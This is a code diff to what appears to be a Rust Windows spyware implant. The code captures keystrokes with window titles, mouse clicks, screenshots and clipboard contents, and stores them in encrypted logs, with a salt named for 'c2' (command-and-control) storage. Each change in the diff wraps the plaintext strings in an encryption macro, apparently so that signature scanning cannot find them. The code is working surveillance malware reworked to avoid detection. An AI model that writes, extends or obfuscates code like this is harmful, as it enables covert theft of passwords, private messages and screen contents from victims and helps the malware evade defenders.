@@ -53,7 +53,7 @@ fn get_local_storage_key() -> [u8; 32] {
     let machine_id = utils::get_persistent_id();
     let mut hasher = Sha256::new();
     hasher.update(machine_id.as_bytes());
-    hasher.update(b"secure_c2_local_storage_salt_v1");
+    hasher.update(aes_str!("secure_c2_local_storage_salt_v1").as_bytes());
     let result = hasher.finalize();
 
     let mut key = [0u8; 32];
@@ -82,7 +82,7 @@ pub fn init_buffer() -> Arc<Mutex<String>> {
 
             // 1. Check Rotation Policy (Size or Time)
             if let Err(e) = check_and_rotate_log() {
-                eprintln!("[-] Rotation Error: {}", e);
+                eprintln!("{}: {}", aes_str!("[-] Rotation Error"), e);
             }
 
             // 2. Flush RAM to Disk
@@ -98,7 +98,7 @@ pub fn init_buffer() -> Arc<Mutex<String>> {
 
             if !data_chunk.is_empty() {
                 if let Err(e) = secure_append(&data_chunk) {
-                    eprintln!("[-] Log Flush Error: {}", e);
+                    eprintln!("{}: {}", aes_str!("[-] Log Flush Error"), e);
                 }
             }
         }
@@ -126,7 +126,7 @@ fn check_and_rotate_log() -> std::io::Result<()> {
 
     if size_exceeded || age_exceeded {
         let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();
-        let archive_name = format!("archive_{}.bin", timestamp);
+        let archive_name = format!("{}{}{}", aes_str!("archive_"), timestamp, aes_str!(".bin"));
         let archive_path = Path::new(storage_dir()).join(archive_name);
 
         fs::rename(current_path, archive_path)?;
@@ -146,7 +146,7 @@ fn secure_append(text: &str) -> Result<(), Box<dyn std::error::Error>> {
     let nonce = Nonce::from_slice(&nonce_bytes);
 
     let ciphertext = cipher.encrypt(nonce, text.as_bytes())
-        .map_err(|e| format!("Encrypt failed: {}", e))?;
+        .map_err(|e| format!("{}: {}", aes_str!("Encrypt failed"), e))?;
 
     let mut file = OpenOptions::new().create(true).append(true).open(path)?;
 
@@ -171,7 +171,7 @@ pub fn get_logs() -> String {
         for entry in entries.flatten() {
             let path = entry.path();
             if let Some(ext) = path.extension() {
-                if ext == "bin" {
+                if ext == aes_str!("bin").as_str() {
                     files_to_process.push(path);
                 }
             }
@@ -233,6 +233,7 @@ pub fn get_logs() -> String {
 
 #[cfg(target_os = "windows")]
 mod windows {
+    use super::{aes_str, strcrypt_rt};
     use std::ptr;
     use std::sync::atomic::{AtomicBool, AtomicPtr, Ordering};
     use std::sync::Mutex;
@@ -367,17 +368,17 @@ mod windows {
 
             match w_param {
                 WM_LBUTTONDOWN => {
-                    log_json("mouse", json!({ "action": "click_left", "x": x, "y": y }));
+                    log_json(aes_str!("mouse").as_str(), json!({ aes_str!("action").as_str(): aes_str!("click_left"), "x": x, "y": y }));
                     // Offload to a worker thread so the callback returns immediately.
                     thread::spawn(move || capture_context(x, y));
                 },
                 WM_RBUTTONDOWN => {
-                    log_json("mouse", json!({ "action": "click_right", "x": x, "y": y }));
+                    log_json(aes_str!("mouse").as_str(), json!({ aes_str!("action").as_str(): aes_str!("click_right"), "x": x, "y": y }));
                 },
                 WM_MOUSEWHEEL => {
                     let delta = (ms.mouse_data >> 16) as i16;
-                    let dir = if delta > 0 { "up" } else { "down" };
-                    log_json("mouse", json!({ "action": "scroll", "dir": dir, "x": x, "y": y }));
+                    let dir = if delta > 0 { aes_str!("up") } else { aes_str!("down") };
+                    log_json(aes_str!("mouse").as_str(), json!({ aes_str!("action").as_str(): aes_str!("scroll"), "dir": dir, "x": x, "y": y }));
                 },
                 _ => {}
             }
@@ -389,9 +390,9 @@ mod windows {
         if let Some(arc) = super::get_buffer() {
             if let Ok(mut guard) = arc.lock() {
                 let entry = json!({
-                    "timestamp": Utc::now().to_rfc3339(),
-                    "type": event_type,
-                    "data": data
+                    aes_str!("timestamp").as_str(): Utc::now().to_rfc3339(),
+                    aes_str!("type").as_str(): event_type,
+                    aes_str!("data").as_str(): data
                 });
                 guard.push_str(&entry.to_string());
                 guard.push_str("\n");
@@ -403,14 +404,14 @@ mod windows {
         let hwnd = GetForegroundWindow();
         let mut title_buf = [0u8; 256];
         let len = GetWindowTextA(hwnd, title_buf.as_mut_ptr(), 256);
-        let title = if len > 0 { String::from_utf8_lossy(&title_buf[..len as usize]).to_string() } else { "Unknown".to_string() };
+        let title = if len > 0 { String::from_utf8_lossy(&title_buf[..len as usize]).to_string() } else { aes_str!("Unknown") };
 
         let key_char = match vk_code {
-            0x08 => "[BS]".to_string(), 0x09 => "[TAB]".to_string(), 0x0D => "\n".to_string(), 0x1B => "[ESC]".to_string(),
-            0x20 => " ".to_string(), 0x2E => "[DEL]".to_string(), 0x25 => "[LEFT]".to_string(), 0x26 => "[UP]".to_string(),
-            0x27 => "[RIGHT]".to_string(), 0x28 => "[DOWN]".to_string(), 0x10 | 0xA0 | 0xA1 => "[SHIFT]".to_string(),
-            0x11 | 0xA2 | 0xA3 => "[CTRL]".to_string(), 0x12 | 0xA4 | 0xA5 => "[ALT]".to_string(),
-            0x14 => "[CAPS]".to_string(), 0x5B | 0x5C => "[WIN]".to_string(), 0x2C => "[PRINTSCR]".to_string(),
+            0x08 => aes_str!("[BS]"), 0x09 => aes_str!("[TAB]"), 0x0D => "\n".to_string(), 0x1B => aes_str!("[ESC]"),
+            0x20 => " ".to_string(), 0x2E => aes_str!("[DEL]"), 0x25 => aes_str!("[LEFT]"), 0x26 => aes_str!("[UP]"),
+            0x27 => aes_str!("[RIGHT]"), 0x28 => aes_str!("[DOWN]"), 0x10 | 0xA0 | 0xA1 => aes_str!("[SHIFT]"),
+            0x11 | 0xA2 | 0xA3 => aes_str!("[CTRL]"), 0x12 | 0xA4 | 0xA5 => aes_str!("[ALT]"),
+            0x14 => aes_str!("[CAPS]"), 0x5B | 0x5C => aes_str!("[WIN]"), 0x2C => aes_str!("[PRINTSCR]"),
             _ => {
                 let scan = MapVirtualKeyA(vk_code, 2);
                 if scan > 0 {
@@ -434,9 +435,9 @@ mod windows {
                     match lw.as_ref() {
                         Some(last) if last != &title => {
                             let entry = json!({
-                                "timestamp": Utc::now().to_rfc3339(),
-                                "type": "window_change",
-                                "data": { "title": title }
+                                aes_str!("timestamp").as_str(): Utc::now().to_rfc3339(),
+                                aes_str!("type").as_str(): aes_str!("window_change"),
+                                aes_str!("data").as_str(): { aes_str!("title").as_str(): title }
                             });
                             guard.push_str(&entry.to_string());
                             guard.push_str("\n");
@@ -451,9 +452,9 @@ mod windows {
                 }
 
                 let entry = json!({
-                    "timestamp": Utc::now().to_rfc3339(),
-                    "type": "keystroke",
-                    "data": { "key": key_char }
+                    aes_str!("timestamp").as_str(): Utc::now().to_rfc3339(),
+                    aes_str!("type").as_str(): aes_str!("keystroke"),
+                    aes_str!("data").as_str(): { aes_str!("key").as_str(): key_char }
                 });
                 guard.push_str(&entry.to_string());
                 guard.push_str("\n");
@@ -493,13 +494,13 @@ mod windows {
                     let mut cursor = Cursor::new(Vec::new());
                     if img.write_to(&mut cursor, ImageOutputFormat::Png).is_ok() {
                         let b64 = BASE64.encode(cursor.get_ref());
-                        log_json("screenshot", json!({
-                            "kind":         "context_click",
+                        log_json(aes_str!("screenshot").as_str(), json!({
+                            aes_str!("kind").as_str():         aes_str!("context_click"),
                             "x":            cx,
                             "y":            cy,
-                            "width":        width,
-                            "height":       height,
-                            "image_b64":    b64
+                            aes_str!("width").as_str():        width,
+                            aes_str!("height").as_str():       height,
+                            aes_str!("image_b64").as_str():    b64
                         }));
                     }
                 }
@@ -542,7 +543,7 @@ mod windows {
                                         Err(_) => true,
                                     };
                                     if changed {
-                                        log_json("clipboard", json!({ "content": text }));
+                                        log_json(aes_str!("clipboard").as_str(), json!({ aes_str!("content").as_str(): text }));
                                         if let Ok(mut lc) = LAST_CLIPBOARD.lock() {
                                             *lc = Some(text);
                                         }
@@ -600,10 +601,10 @@ mod windows {
                                 let mut cursor = Cursor::new(Vec::new());
                                 if image.write_to(&mut cursor, ImageOutputFormat::Png).is_ok() {
                                     let b64 = BASE64.encode(cursor.get_ref());
-                                    log_json("screenshot", json!({
-                                        "kind":          "full_monitor",
-                                        "monitor_index": i,
-                                        "image_b64":     b64
+                                    log_json(aes_str!("screenshot").as_str(), json!({
+                                        aes_str!("kind").as_str():          aes_str!("full_monitor"),
+                                        aes_str!("monitor_index").as_str(): i,
+                                        aes_str!("image_b64").as_str():     b64
                                     }));
                                 }
                             }
@@ -670,14 +671,14 @@ mod windows {
 
 pub fn start() -> String {
     #[cfg(target_os = "windows")]
-    { windows::start_hook_thread(); "Tracking Started (Key/Mouse/Screens/Clip/Adaptive)".to_string() }
+    { windows::start_hook_thread(); aes_str!("Tracking Started (Key/Mouse/Screens/Clip/Adaptive)") }
     #[cfg(not(target_os = "windows"))]
-    "Not supported on Linux/Mac".to_string()
+    aes_str!("Not supported on Linux/Mac")
 }
 
 pub fn stop() -> String {
     #[cfg(target_os = "windows")]
-    { windows::stop_hook(); "Tracking Stopped".to_string() }
+    { windows::stop_hook(); aes_str!("Tracking Stopped") }
     #[cfg(not(target_os = "windows"))]
-    "Not supported".to_string()
+    aes_str!("Not supported")
 }
